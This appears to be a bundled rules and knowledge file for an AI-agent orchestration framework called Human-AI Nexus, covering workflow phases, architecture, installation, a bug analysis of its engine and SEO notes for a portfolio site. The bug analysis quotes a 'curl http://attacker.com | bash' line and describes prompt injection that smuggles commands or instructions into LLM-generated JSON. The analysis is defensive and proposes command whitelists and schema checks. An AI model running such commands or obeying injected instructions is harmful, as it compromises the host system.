### 🛠️ Phase 0: Inisialisasi (`INIT`)
*   **Aksi**: Sistem memetakan folder proyek, mendeteksi keberadaan folder `nexus/`, dan menyiapkan lingkungan eksekusi.
*   **Intel**: Memeriksa `package.json` untuk memastikan seluruh dependensi engine tersedia.

### 🔍 Phase 1: Audit (Scanning & Intelligence)
*   **Tujuan**: Mengidentifikasi celah keamanan, bug, atau potensi optimasi.
*   **Mode Kerja**:
    *   **Learning**: Memberikan edukasi kepada developer melalui laporan spesialis (Cyber, UX, SEO).
    *   **Efficient**: Fokus pada resolusi cepat dengan laporan tunggal dari PM.
*   **Guardrails**: Engine dilarang memindai file sensitif tanpa persetujuan eksplisit dari User.

### 📅 Phase 2: Planning (Strategi & Kontrak)
*   **Tujuan**: Menyusun *Implementation Plan* sebagai kontrak kerja AI.
*   **Logika**: Mengubah setiap temuan audit menjadi tugas (tasks) yang terukur.
*   **Output**: File `.md` di folder `documentation/planning/` yang harus ditinjau manusia.

### 🚀 Phase 3: Execution (Pengerjaan)
*   **Tujuan**: AI melakukan modifikasi kode atau pembuatan fitur.
*   **Aturan**: AI hanya diperbolehkan menjalankan perintah yang sesuai dengan *Implementation Plan* yang telah disetujui.

### 🔍 Phase 4: Verification (Quality Control)
*   **Tujuan**: Validasi hasil kerja.
*   **Mekanisme**: Membandingkan status proyek terbaru dengan target yang ditetapkan di Phase 1 & 2.
*   **Zero Flaws**: Jika ditemukan ketidaksesuaian, sistem akan memaksa siklus kembali ke Phase 1.

### 📝 Phase 5: Finalization & Records
*   **Tujuan**: Pencatatan sejarah dan pembaruan pengetahuan.
*   **Output**: 
    *   `memory/short_term/`: Log lengkap setiap siklus.
    *   `memory/long_term/`: Ringkasan pelajaran teknis untuk referensi di masa depan (The HUB).
    *   **🧠 Universal Nexus Collision Logic (Opsi A maupun Opsi B)**:
        *   Logika ini adalah standar baku yang diterapkan di seluruh pipeline **HUB (Knowledge)** dan **SKILL**.
        *   **Kondisi**: Terjadi saat ada kemiripan antara "A" (yang sudah ada) dan "B" (yang baru masuk/direfactor), baik itu berupa teori di HUB maupun instruksi teknis di SKILL.
        *   **Implementasi di HUB & SKILL**:
          Opsi A: { Standard_Pattern_A } 
          Opsi B: { Alternative_Pattern_B }
          (Opsi Tak Terbatas untuk variasi solusi)
        *   **Alur Refactoring Universal**:
            1.  **HUB Refactor**: Menggabungkan variasi dokumentasi fitur di folder `memory/long_term/`.
            2.  **SKILL Refactor**: Jika di folder `skill/` ditemukan teknik koding baru yang mirip dengan yang lama, keduanya disimpan sebagai **Pilihan Opsi (A/B/dst)** sebagai pilihan strategi bagi agen.
        *   **Tujuan**: Menjamin bahwa sistem tidak hanya memiliki satu cara kerja, melainkan sebuah **"Decision Tree"** dengan opsi tak terbatas yang kaya bagi AI untuk memilih solusi paling optimal (Context-Aware).

### 🌾 Phase 6: Harvesting (Cross-Project Knowledge)
*   **Tujuan**: Sinkronisasi pengetahuan lintas proyek.
*   **Aksi**: Mengumpulkan dokumentasi "Emas" dari proyek lain ke dalam `golden/` hub pusat.

---
*Dokumen ini merupakan bagian dari standar operasional Human-AI Nexus.*

---


### 📜 RULE: architecture.md
# System Architecture

The Human-AI Nexus is built as a modular orchestration system.

## Architecture Diagram

```mermaid
graph TD
    User([User/Human]) -- Approval --> PM[Project Manager Agent]
    User -- Initial Request --> Orc[Nexus Orchestrator]
    
    subgraph "Core Engine"
        Orc -- Trigger --> Audit[Audit Phase]
        Audit -- Results --> Plan[Planning Phase]
        Plan -- Tasks --> Exec[Execution Phase]
        Exec -- Success --> Record[Finalization Phase]
    end
    
    subgraph "Knowledge & Standards"
        Agent[(Agent Library)]
        Skill[(Skill/Standards)]
        Knowledge[(Knowledge Base)]
    end
    
    Audit -.-> Agent
    Plan -.-> Skill
    Record -.-> Knowledge
    
    Record -- Recursive --> Audit
```

## Components

### 1. Nexus Orchestrator (`NexusEngine.js`)
The central brain that coordinates the flow between phases. It ensures that data from the Audit phase is correctly passed to Planning, and that Execution only happens after approval.

### 2. Agent Layer
A collection of markdown files in `agent/` that define the persona, responsibilities, and guardrails for different AI agents (e.g., Architect, Engineer, QA).

### 3. Skill Layer
Technical standards and "best practice" snippets in `skill/` that guide the agents during the Execution phase.

### 4. Persistence Layer
Folders for `audit`, `planning`, `records`, and `knowledge` that ensure every step of the process is documented and persisted for long-term project memory.

---

## Ecosystem Integration

Nexus AI is designed to be highly portable and integrable with existing codebases.

- **External Pipeline**: The system intelligently detects and manages project-specific documentation and local AI "brains" inside the project root.
- **Deep Recaps**: Detailed documentation on how the engine interacts with external environments:
    - [Internal Pipeline Recap](NEXUS_INTERNAL_PIPELINE_RECAP.md)
    - [External Pipeline Recap](NEXUS_EXTERNAL_PIPELINE_RECAP.md)


---


### 📜 RULE: getting-started.md
# Getting Started with Human-AI Nexus

Human-AI Nexus is a framework designed to bridge the gap between human intent and AI execution through structured documentation and automated orchestration.

## Installation

### As a CLI tool
You can install the framework globally or run it via npx:

```bash
# Recommended if not published:
npx github:Faisal-Trainer/Human-AI-Nexus

# If published to npm:
npx @faisal-trainer/human-ai-nexus
```

### For Development
Clone the repository and install dependencies:

```bash
git clone https://github.com/Faisal-Trainer/Human-AI-Nexus.git
cd Human-AI-Nexus
npm install
```

## Basic Usage

To start a standard workflow cycle (Audit -> Plan -> Execute), run:
    
```bash
npx github:Faisal-Trainer/Human-AI-Nexus nexus run
```

*Note: You can also use `npm start` if you are working within the framework source directory.*

## Core Concepts

1.  **Documentation-First**: No code is written before a plan is approved.
2.  **Traceability**: Every action is linked to an audit finding and a plan.
3.  **Recursive Audit**: The cycle repeats until "Zero Flaws" are achieved.

## Project Structure

- `agent/`: Specialized role descriptions for AI agents.
- `audit/`: Generated audit reports.
- `documentation/planning/`: Implementation plans.
- `skill/`: Technical standards and snippets.
- `src/`: Core Nexus Engine source code.

---


### 📜 RULE: workflow.md
# Nexus Workflow

The Human-AI Nexus follows a 4-phase cyclical workflow designed to ensure maximum quality and traceability.

## 1. Audit Phase
The system (or specialized agents) scans the current state of the project.
- **Security Guardrails**: The engine will request explicit permission before scanning sensitive files (`.env`, `package.json`, `composer.json`).
- **Input**: Source code, documentation, and (if permitted) configuration files.
- **Output**: An Audit Report in `audit/`.
- **Goal**: Identify gaps, bugs, or opportunities for improvement.

## 2. Planning Phase
Based on the audit report, a detailed plan is generated.
- **Input**: Audit Report.
- **Output**: Implementation Plan in `documentation/planning/`.
- **Human Role**: Review and approve the plan.

## 3. Execution Phase
Specialized agents execute the tasks defined in the plan.
- **Input**: Approved Implementation Plan.
- **Action**: Code generation, configuration updates, or content creation.
- **Constraint**: Agents must follow the standards in `skill/`.

## 4. Finalization Phase
The results are recorded and the knowledge base is updated.
- **Input**: Execution results.
- **Output**: Logs in `memory/short_term/` and summaries in `documentation/summary/`.
- **Loop**: Trigger a new Audit to verify the changes.

---

### Zero Flaws Enforcement
The cycle repeats until an audit results in "Zero Flaws". This ensures that no technical debt or bugs are left behind.

---

## 🧠 DEEP WISDOM INJECTION (Phase 5 Institutionalization)
> Data ini adalah bagian dari memori inti agen yang diserap dari Knowledge Base.

### 📘 KNOWLEDGE: NEXUS_AI_NEXT_GEN_BUGS.MD

# NEXUS AI — Prediksi Bug Generasi Berikutnya
> **VERSION**: v1 | **Last Updated**: 26/05/2026


**Tipe Dokumen:** Predictive Failure Analysis  
**Basis:** Source code review mendalam — setelah seluruh bug generasi pertama diselesaikan  
**Metodologi:** Setiap bug diprediksi dari pola kode aktual, bukan spekulasi  

> **Konteks:** Dokumen ini menjawab pertanyaan: *"Setelah semua bug R-01 s/d R-08 selesai, bug apa yang akan muncul selanjutnya?"*  
> Semua temuan di sini berakar pada kode yang sudah ada — bukan fitur baru.

---

## Klasifikasi

| Kode | Severity | Kategori |
|------|----------|----------|
| G2-01 | 🔴 Kritis | Logic Bug |
| G2-02 | 🔴 Kritis | Security |
| G2-03 | 🔴 Kritis | Data Integrity |
| G2-04 | 🔴 Kritis | Concurrency |
| G2-05 | 🟡 Sedang | Logic Bug |
| G2-06 | 🟡 Sedang | Performance |
| G2-07 | 🟡 Sedang | Logic Bug |
| G2-08 | 🟡 Sedang | Data Integrity |
| G2-09 | 🟡 Sedang | Logic Bug |
| G2-10 | 🟢 Minor | Reliability |
| G2-11 | 🟢 Minor | Correctness |
| G2-12 | 🟢 Minor | Logic |

---

## 🔴 Bug Kritis

---

### G2-01 — `COMMAND_EXEC` di Modifier Adalah Arbitrary Code Execution
**File:** `agent/core/Modifier.js`, baris ~45  
**Kode aktual:**
```javascript
case 'COMMAND_EXEC':
    const { execSync } = require('child_process');
    execSync(action.command, { cwd: this.rootPath, stdio: 'ignore' });
    return true;
```

**Mengapa ini akan meledak setelah R-01 selesai:**  
Setelah `spawnRealLaravel()` diimplementasikan dan pipeline benar-benar berjalan, `COMMAND_EXEC` akan digunakan aktif — untuk `composer install`, `artisan migrate`, dan seterusnya. Masalahnya: `action.command` adalah string bebas yang datang dari hasil LLM (`blueprintApp` → `generate_architecture`). LLM bisa menghasilkan command apa saja.

**Skenario kegagalan konkret:**
- LLM menghasilkan blueprint dengan `"command": "rm -rf vendor && composer install"` → vendor terhapus
- LLM menghasilkan `"command": "curl http://attacker.com | bash"` jika prompt injection berhasil
- `execSync` bersifat **synchronous dan blocking** — satu command yang hang (misal `composer install` lambat) memblokir seluruh event loop Node.js

**Fix:**
```javascript
// 1. Ganti execSync dengan spawn async
// 2. Tambahkan whitelist command yang diizinkan
const ALLOWED_COMMANDS = ['composer', 'php', 'npm', 'node'];
const cmdParts = action.command.split(' ');
if (!ALLOWED_COMMANDS.includes(cmdParts[0])) {
    throw new Error(`COMMAND_EXEC: Command "${cmdParts[0]}" not in whitelist`);
}
// 3. Gunakan spawn, bukan execSync
await spawnAsync(cmdParts[0], cmdParts.slice(1), { cwd: this.rootPath });
```

---

### G2-02 — `blueprintApp()` Mem-parse JSON dari LLM Tanpa Validasi Schema
**File:** `agent/core/NexusEngine.js`, metode `blueprintApp()`  
**Kode aktual:**
```javascript
const jsonMatch = response.match(/\{[\s\S]*\}/);
const blueprint = JSON.parse(jsonMatch ? jsonMatch[0] : response);
await fs.writeJson(blueprintPath, blueprint, { spaces: 2 });
```

**Mengapa ini akan meledak:**  
Setelah pipeline berjalan end-to-end, `blueprint` menjadi sumber kebenaran untuk seluruh `ImplementationPhase` — menentukan model apa yang dibuat, migration apa yang dijalankan, dan Livewire component apa yang di-generate. LLM tidak selalu menghasilkan struktur yang persis sama.

**Skenario kegagalan konkret:**
- LLM menambahkan key tambahan: `"dependencies": ["laravel/telescope"]` → `ImplementationPhase` mengiterasi key yang tidak dikenal, tidak error, tapi menghasilkan file-file aneh
- LLM menghasilkan `"models": "User"` (string, bukan array) → `for (const model of models)` throw `TypeError: models is not iterable`
- LLM menambahkan instruksi dalam natural language di dalam JSON: `"models": ["User", "IMPORTANT: also add Admin model"]` → file bernama `IMPORTANT: also add Admin model.php` dibuat di filesystem

**Fix:**
```javascript
const BLUEPRINT_SCHEMA = {
    required: ['project_name', 'models', 'migrations', 'livewire_components'],
    arrays: ['models', 'migrations', 'livewire_components'],
    strings: ['project_name']
};

function validateBlueprint(bp) {
    for (const key of BLUEPRINT_SCHEMA.required) {
        if (!(key in bp)) throw new Error(`Blueprint missing required key: ${key}`);
    }
    for (const key of BLUEPRINT_SCHEMA.arrays) {
        if (!Array.isArray(bp[key])) throw new Error(`Blueprint key "${key}" must be array`);
        // Sanitize: hanya izinkan nama yang valid (alphanumeric + underscore)
        bp[key] = bp[key].filter(v => typeof v === 'string' && /^[a-zA-Z_][a-zA-Z0-9_]*$/.test(v));
    }
    return bp;
}
```

---

### G2-03 — `wrapAsConditional()` Menyebabkan Collision Accumulation yang Tidak Pernah Diselesaikan
**File:** `agent/core/NexusEngine.js`, metode `wrapAsConditional()`  
**File terkait:** `agent/core/phases/KnowledgePhase.js`, metode `harvest()`

**Kode aktual:**
```javascript
// NexusEngine.js
wrapAsConditional(existing, added, context = 'Nexus Knowledge') {
    return `\n# NEXUS COLLISION RESOLVED: ${context}\nOpsi A:\n${existing}\nOpsi B:\n${added}\n`;
}

// KnowledgePhase.js - saat harvest menemukan file yang sudah ada:
const merged = this.engine.wrapAsConditional(oldContent, newContent, `Collision in ${file}...`);
await fs.writeFile(targetPath, merged);
```

**Mengapa ini akan meledak setelah knowledge loop aktif:**  
Setiap kali sandbox ke-2, ke-3, ke-4 di-harvest dan menemukan file knowledge yang sudah ada, file itu di-wrap lagi. Tidak ada mekanisme yang menyelesaikan collision ini secara otomatis. Setelah 10 sandbox, satu file knowledge bisa berisi 10 level nesting `Opsi A / Opsi B`.

**Skenario kegagalan konkret:**
- `Distiller.simplifyContent()` mencoba meringkas file yang isinya adalah collision block bersarang → LLM menghasilkan ringkasan tidak koheren
- `getSemanticTags()` mencari regex `METADATA` tapi terhalang oleh collision headers → semantic index tidak dibangun
- File knowledge tumbuh eksponensial: 100 sandbox × rata-rata 5 collision = file berukuran puluhan MB

**Fix:** Tambahkan collision resolver otomatis di `MemoryPipeline.processHarvestData()` — gunakan `DecisionEngine` yang sudah ada untuk memilih versi terbaik, atau merge secara semantic, bukan hanya append.

---

### G2-04 — `ParallelRunner` Membuang Semua Hasil Jika Satu Worker Throw
**File:** `agent/core/ParallelRunner.js`  
**Kode aktual:**
```javascript
static async run(items, taskFn, limit = 3) {
    const results = new Array(items.length);
    let index = 0;
    
    const worker = async () => {
        while (index < items.length) {
            const currentIndex = index++;
            try {
                results[currentIndex] = await taskFn(items[currentIndex]);
            } catch (e) {
                results[currentIndex] = e;
                throw e;  // ← INI MASALAHNYA
            }
        }
    };

    const workers = [];
    for (let i = 0; i < Math.min(limit, items.length); i++) {
        workers.push(worker());
    }

    await Promise.all(workers);  // ← Jika satu throw, semua dibatalkan
    return results;
}
```

**Mengapa ini akan meledak:**  
`AuditPhase` memanggil `ParallelRunner.run(specialists, ...)` dengan 6 specialist. Jika specialist ke-3 (misal `database-architect`) throw error karena project tidak punya database files, `Promise.all` akan **reject seluruh batch**. Hasil dari specialist 1 dan 2 yang sudah selesai dengan sukses dibuang begitu saja.

**Skenario konkret:**  
Project baru yang di-audit tidak punya `database/` folder. `database-architect` scanner throw "No migration files found". Seluruh audit phase gagal. Laporan dari `cyber-security`, `ux-engineer`, dan `seo-performance` yang sudah selesai tidak pernah tersimpan.

**Fix:**
```javascript
} catch (e) {
    results[currentIndex] = { error: e.message, severity: 'SCANNER_ERROR' };
    // Jangan throw — catat error tapi lanjut ke item berikutnya
}
```

---

## 🟡 Bug Sedang

---

### G2-05 — `blueprintApp()` Hanya Berjalan Jika README Mengandung Magic String
**File:** `agent/core/NexusEngine.js`  
**Kode aktual:**
```javascript
async blueprintApp(options = {}) {
    const readmePath = path.join(this.rootPath, 'README.md');
    if (!(await fs.pathExists(readmePath))) return;
    const readmeContent = await fs.readFile(readmePath, 'utf8');
    if (!readmeContent.includes('Generated by Nexus Autonomous Pipeline')) return;
    // ...
}
```

**Masalah:**  
`blueprintApp` hanya berjalan jika README mengandung string `'Generated by Nexus Autonomous Pipeline'`. Sandbox yang dibuat oleh `spawnRealLaravel()` (setelah R-01 difix) menggunakan template Laravel default yang **tidak mengandung string ini**. Artinya `blueprintApp` selalu di-skip → tidak ada blueprint → `ImplementationPhase` selalu skip karena `NEXUS_BLUEPRINT.json` tidak ada.

**Dampak:** Seluruh code generation phase tidak pernah berjalan pada project baru yang di-spawn.

**Fix:** Buat `spawnRealLaravel()` menulis README dengan magic string tersebut, atau ubah kondisi menjadi opt-in yang lebih fleksibel:
```javascript
const isNexusManaged = readmeContent.includes('Generated by Nexus') || 
                       await fs.pathExists(path.join(this.rootPath, 'NEXUS_BLUEPRINT.json'));
if (!isNexusManaged) return;
```

---

### G2-06 — `MemoryGovernor.ensureDirectories()` Dipanggil Synchronous di Constructor
**File:** `agent/core/MemoryGovernor.js`  
**Kode aktual:**
```javascript
constructor(rootPath) {
    this.rootPath = rootPath;
    this.memoryPath = path.join(this.rootPath, 'memory');
    this.ensureDirectories(); // ← synchronous fs call di constructor
}

ensureDirectories() {
    const dirs = ['raw', 'normalized', 'semantic', 'distilled', ...];
    dirs.forEach(dir => {
        fs.ensureDirSync(path.join(this.memoryPath, dir)); // ← blocking I/O
    });
}
```

**Masalah:**  
`NexusEngine` membuat `new MemoryGovernor(rootPath)` di constructor-nya. Ini memicu 7 `fs.ensureDirSync` secara synchronous di startup. Pada sistem dengan I/O lambat (NFS mount, Docker volume, Windows dengan antivirus), ini bisa memblokir thread utama 100-500ms per direktori.

Setelah R-01 difix dan 100 sandbox berjalan, ini menjadi bottleneck nyata — setiap sandbox spawn membuat `NexusEngine` baru (atau me-reset root path), dan setiap reset memicu 7 blocking I/O calls lagi.

**Fix:** Ubah `ensureDirectories()` menjadi async dan panggil di `initRedis()` atau buat `static async create(rootPath)` factory method.

---

### G2-07 — `Machinist.integrate()` Memodifikasi `NexusEngine.js` dengan String Replacement Rapuh
**File:** `agent/core/Machinist.js`  
**Kode aktual:**
```javascript
async integrate(name, type = 'auditor') {
    let content = await fs.readFile(this.enginePath, 'utf8');
    
    const requireAnchor = "const Distiller = require('./Distiller');";
    content = content.replace(
        requireAnchor,
        `${requireAnchor}\nconst ${name} = require('${relPath}');`
    );

    const initAnchor = "this.distiller = new Distiller(this.knowledgePath);";
    content = content.replace(
        initAnchor,
        `${initAnchor}\n        this.${instanceName} = new ${name}(this.rootPath);`
    );

    await fs.writeFile(this.enginePath, content);
}
```

**Masalah:**  
`Machinist.integrate()` memodifikasi source code `NexusEngine.js` hidup-hidup dengan mencari string literal `"const Distiller = require('./Distiller');"` sebagai anchor point. Ini akan gagal jika:
1. Developer menambahkan komentar setelah baris tersebut
2. Format file berubah (prettier/eslint auto-format mengubah spasi/quotes)
3. `integrate()` dipanggil dua kali untuk komponen berbeda → anchor pertama mungkin sudah berubah karena inject pertama

Setelah pipeline aktif dan Machinist mulai di-invoke untuk forging scanner baru, setiap call ke `integrate()` yang gagal meninggalkan `NexusEngine.js` dalam kondisi parsial-corrupt (anchor diganti tapi tidak semua inject berhasil).

**Fix:** Gunakan AST parser (seperti `@babel/parser` atau `acorn`) untuk modifikasi kode, bukan string replacement. Atau gunakan sentinel comment yang lebih robust: `// NEXUS_INJECT_REQUIRE` dan `// NEXUS_INJECT_INIT`.

---

### G2-08 — `MemoryPipeline.processHarvestData()` Menghapus Folder Harvest Setelah Proses
**File:** `agent/core/MemoryPipeline.js`  
**Kode aktual:**
```javascript
async processHarvestData() {
    // ... proses file harvest ...
    
    await fs.emptyDir(harvestPath);  // ← Hapus semua setelah proses
    console.log('   🧹 Harvest folder recycled.');
}
```

**Masalah:**  
`golden/harvest/` dikosongkan setelah setiap `processHarvestData()`. Jika proses di tengah-tengah crash (misalnya `versionedWrite()` gagal karena disk penuh), beberapa file sudah diproses dan dihapus dari harvest, tapi belum semua masuk ke HUB. Tidak ada cara untuk replay atau recovery. Data dari sandbox yang sudah di-destroy hilang permanen.

**Fix:** Gunakan move-then-delete, bukan copy-then-delete. Atau tambahkan transaction log: catat file yang sudah berhasil di-ingest sebelum `emptyDir`.

```javascript
const processedLog = path.join(harvestPath, '.processed.json');
const processed = [];
for (const file of files) {
    await this.versionedWrite(dest, content);
    processed.push(file);
    await fs.writeJson(processedLog, processed); // checkpoint
}
// Hanya hapus setelah semua berhasil tercatat
await fs.emptyDir(harvestPath);
```

---

### G2-09 — `Modifier.fileReplace()` Throw Jika Target Content Tidak Ditemukan (Tidak Di-handle)
**File:** `agent/core/Modifier.js`  
**Kode aktual:**
```javascript
async fileReplace(filePath, targetContent, replacementContent) {
    if (await fs.pathExists(filePath)) {
        let content = await fs.readFile(filePath, 'utf8');
        if (content.includes(targetContent)) {
            const newContent = content.replace(targetContent, replacementContent);
            await fs.writeFile(filePath, newContent);
            return true;
        }
        throw new Error(`Target content not found in file: ${filePath}`); // ← throw tanpa context
    }
    throw new Error(`File not found: ${filePath}`);
}
```

**Masalah:**  
`FILE_REPLACE` action dari `PlanningPhase` menggunakan content yang dihasilkan LLM sebagai `targetContent`. LLM mungkin menghasilkan konten yang sedikit berbeda dari file aktual (whitespace, newline, encoding). Akibatnya `fileReplace` selalu throw pada iterasi kedua ke atas karena file sudah dimodifikasi oleh iterasi pertama.

Di `ExecutionPhase`, error ini hanya di-catch dan dicatat sebagai `task.status = 'failed'` — lalu `continue` ke task berikutnya. Tidak ada rollback. Setelah 10 task, mungkin 6 berhasil dan 4 gagal diam-diam.

**Dampak nyata:** Developer melihat "✅ Execution phase completed" tapi setengah task tidak benar-benar dieksekusi.

**Fix:** `FILE_REPLACE` harus menjadi `FILE_PATCH` yang menggunakan diff/patch semantics, bukan exact string match. Atau tambahkan fuzzy matching dengan normalisasi whitespace sebelum cek `includes()`.

---

## 🟢 Bug Minor

---

### G2-10 — `LocalIntelligence` Circuit Breaker Tidak Pernah Kembali ke CLOSED
**File:** `agent/core/LocalIntelligence.js`  
**Kondisi:** Saat `failures >= threshold`, state berubah ke `OPEN`. Setelah `HALF_OPEN`, jika satu request berhasil, seharusnya kembali ke `CLOSED`. Jika implementasi HALF_OPEN tidak ada (atau hanya state label tanpa logika), circuit breaker hanya bisa OPEN permanen untuk satu session.

**Dampak:** Jika Ollama sempat timeout sekali di awal session, seluruh code generation diblokir untuk sisa session itu meskipun Ollama sudah kembali normal.

---

### G2-11 — `ensureEnv()` di Modifier Menggunakan Path yang Salah
**File:** `agent/core/Modifier.js`  
**Kode aktual:**
```javascript
async ensureEnv(filePath, key, value) {
    const envFile = path.resolve(this.rootPath, '.env');
    // ↑ Parameter `filePath` diabaikan sepenuhnya — selalu pakai rootPath/.env
```

**Masalah:** `action.target` dari task yang memanggil `ENV_ENSURE` sepenuhnya diabaikan. Jika task dimaksudkan untuk memodifikasi `.env` di dalam sandbox (bukan di rootPath), perubahan malah ditulis ke `.env` NEXUS engine itu sendiri.

---

### G2-12 — `getSemanticTags()` Regex Hanya Menangkap Satu Tag Block Per File
**File:** `agent/core/NexusEngine.js`  
**Kode aktual:**
```javascript
const match = content.match(/>\\s*\\*\\*METADATA.*\\*\\*:\\s*\\[(.*)\\]/i);
if (match) return match[1].split(',').map(t => t.trim().toLowerCase());
```

**Masalah:** `String.match()` tanpa flag `g` hanya menangkap kemunculan pertama. Setelah collision wrapping terjadi berulang kali (lihat G2-03), satu file bisa punya beberapa `METADATA` block. Hanya block pertama yang terbaca. Semantic index tidak lengkap.

---

## Ringkasan: Urutan Munculnya Bug

Setelah bug generasi pertama diselesaikan, urutan bug berikut yang paling mungkin muncul pertama kali berdasarkan jalur eksekusi:

```
nexus run (pertama kali setelah fix)
    │
    ├─ blueprintApp() ──────────────── [G2-05] magic string → blueprint tidak dibuat
    │
    ├─ AuditPhase (6 specialists)
    │   └─ ParallelRunner ───────────── [G2-04] satu scanner error → semua dibatalkan
    │
    ├─ ImplementationPhase
    │   └─ blueprintApp() skip
    │       └─ LLM generate JSON ──── [G2-02] schema tidak valid → TypeError di loop
    │
    ├─ ExecutionPhase
    │   └─ COMMAND_EXEC ─────────────── [G2-01] blocking execSync, no whitelist
    │   └─ FILE_REPLACE ─────────────── [G2-09] target content tidak ditemukan
    │
    └─ KnowledgePhase (harvest ke-2 dst)
        └─ collision ─────────────────── [G2-03] wrapAsConditional bertumpuk
        └─ emptyDir crash ───────────── [G2-08] data hilang tanpa recovery
```

**Bug yang paling berbahaya untuk diselesaikan lebih dulu (sebelum G2-01):** G2-04, karena ia menyembunyikan semua bug lain — jika satu scanner gagal, kamu tidak akan pernah tahu scanner mana yang berhasil dan mana yang tidak.

---

*Analisis ini berdasarkan pembacaan langsung file: `Modifier.js`, `NexusEngine.js` (blueprintApp, wrapAsConditional), `ParallelRunner.js`, `MemoryPipeline.js`, `KnowledgePhase.js`, `Machinist.js` (integrate), `LocalIntelligence.js`, `MemoryGovernor.js`.*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, api]

### 📘 KNOWLEDGE: NEXUS_AI INDEXING PORTOFOLIO.MD

# AI Indexing & Discoverability — faisalyusra.my.id
> **VERSION**: v1 | **Last Updated**: 26/05/2026


> Catatan teknis hasil diskusi dengan AI Engineer · Mei 2026

---

## Konteks

SEO tradisional masih relevan, tapi sekarang ada lapisan baru: **AI Discoverability** — yaitu agar websitemu bisa dibaca, dipahami, dan dikutip oleh sistem AI seperti ChatGPT, Perplexity, Google AI Overview, Claude, dan Bing Copilot.

Website: **https://faisalyusra.my.id**  
Stack: Laravel + Livewire + Filament + Tailwind CSS  
Lokasi: Bukittinggi, Sumatera Barat

---

## Audit Hasil Cek

### ✅ Yang Sudah Ada (Bagus)

| Item | Keterangan |
|------|------------|
| Meta description | Ada, deskriptif |
| Meta keywords | Ada |
| OG Tags | Lengkap (og:title, og:image, og:description, dll) |
| Twitter Card | `summary_large_image` |
| Google Site Verification | Ada |
| `robots: index, follow` | Ada |
| Canonical URL | Dinamis via `url()->current()` |
| **JSON-LD Schema (`@graph`)** | Sudah ada & lengkap di `layout/app.blade.php` |
| **`@stack('schemas')`** | Siap untuk inject schema tambahan per halaman |

### ❌ Yang Belum Ada

| Item | Prioritas |
|------|-----------|
| `llms.txt` | 🔴 Tinggi |
| AI crawler di `robots.txt` | 🔴 Tinggi |
| FAQ Schema di `/service` | 🟡 Medium |
| `ArticleSchema` di halaman blog detail | 🟡 Medium |
| JSON Feed (`/feed.json`) | 🟡 Medium |
| Sitemap blog dinamis | 🟡 Medium |

---

## Detail JSON-LD Schema (Sudah Ada)

Lokasi file: `resources/views/layouts/app.blade.php`  
Pattern: **Satu `<script>` + `@graph`** — best practice 2026

### Schema yang sudah terdaftar:

**1. Person Schema**
```json
{
  "@type": "Person",
  "@id": "https://faisalyusra.my.id/#person",
  "name": "Muhammad Faisal Alyusra",
  "alternateName": "Faisal Yusra",
  "jobTitle": "IT Support Spesialis | Web Developer & Digital Consultant",
  "knowsAbout": ["Laravel", "Livewire", "Filament", "Tailwind CSS", "..."],
  "alumniOf": "UIN Sjech M Djamil Djambek Bukittinggi",
  "sameAs": ["LinkedIn", "Google Maps", "GitHub", "Google Scholar"]
}
```

**2. ProfessionalService Schema**
```json
{
  "@type": "ProfessionalService",
  "@id": "https://faisalyusra.my.id/#service",
  "name": "Faisal Yusra | Web Developer & Digital Consultant Bukittinggi",
  "geo": { "latitude": -0.311639, "longitude": 100.38725 },
  "openingHours": "Senin–Sabtu, 08:00–17:00",
  "founder": { "@id": "https://faisalyusra.my.id/#person" }
}
```

**3. WebPage Schema (Dinamis)**
```json
{
  "@type": "WebPage",
  "@id": "[url()->current()]#webpage",
  "publisher": { "@id": "https://faisalyusra.my.id/#service" }
}
```

**4. Blog Schema (Conditional)**
> Aktif otomatis kalau route = `/blog`
```json
{
  "@type": ["WebPage", "Blog"],
  "mainEntity": {
    "@type": "Blog",
    "name": "Blog Faisal Yusra"
  }
}
```

---

## Yang Perlu Dibuat

### 1. `llms.txt`

**Konsep:** File plain text/markdown yang kasih tau LLM crawler siapa kamu dan konten apa yang relevan. Seperti `robots.txt` tapi untuk AI.

**Lokasi:** `public/llms.txt` → akses via `https://faisalyusra.my.id/llms.txt`

**Opsi implementasi:**
- **Statis** — file `.txt` biasa di folder `public/`
- **Dinamis** — route Laravel yang generate konten dari database (lebih powerful)

**Contoh isi:**
```
# Faisal Yusra — Web Developer & Digital Consultant

> Web Developer dan Digital Consultant berbasis di Bukittinggi, Sumatera Barat.
> Membantu UMKM lokal tumbuh melalui teknologi dan memberdayakan talent muda digital.

## Layanan Utama
- Web Application Development (Laravel, PHP)
- IT Support & Maintenance untuk UMKM
- UI/UX Design fungsional
- Digital Consulting untuk bisnis lokal
- Goes To School Program
- Social Media Handling

## Halaman Penting
- [Tentang](https://faisalyusra.my.id/about)
- [Layanan & Harga](https://faisalyusra.my.id/service)
- [Portofolio](https://faisalyusra.my.id/portfolio)
- [Blog](https://faisalyusra.my.id/blog)
- [Kontak](https://faisalyusra.my.id/contact)
```

---

### 2. Update `robots.txt`

Tambahkan izin untuk AI crawler utama:

```
User-agent: GPTBot
Allow: /

User-agent: ClaudeBot
Allow: /

User-agent: PerplexityBot
Allow: /

User-agent: GoogleExtendedBot
Allow: /

User-agent: *
Allow: /

Sitemap: https://faisalyusra.my.id/sitemap.xml
```

---

### 3. FAQ Schema di `/service`

Inject via `@push('schemas')` di view `service.blade.php`.

```blade
@push('schemas')
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {
      "@type": "Question",
      "name": "Berapa biaya jasa pembuatan website di Bukittinggi?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Harga bervariasi tergantung kebutuhan. Tersedia paket untuk UMKM yang disesuaikan dengan tahap bisnis dan anggaran. Hubungi untuk konsultasi gratis."
      }
    },
    {
      "@type": "Question",
      "name": "Apa saja layanan yang tersedia?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Web Application, IT Support, UI/UX Design, Digital Consulting, Goes To School Program, dan Social Media Handling."
      }
    },
    {
      "@type": "Question",
      "name": "Apakah melayani klien di luar Bukittinggi?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Ya, melayani seluruh Indonesia secara remote, dengan fokus utama di Sumatera Barat."
      }
    }
  ]
}
</script>
@endpush
```

---

### 4. Article Schema di Blog Detail

Inject di `blog/show.blade.php` atau `post.blade.php`.

```blade
@push('schemas')
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Article",
  "headline": "{{ $post->title }}",
  "description": "{{ $post->excerpt }}",
  "datePublished": "{{ $post->created_at->toIso8601String() }}",
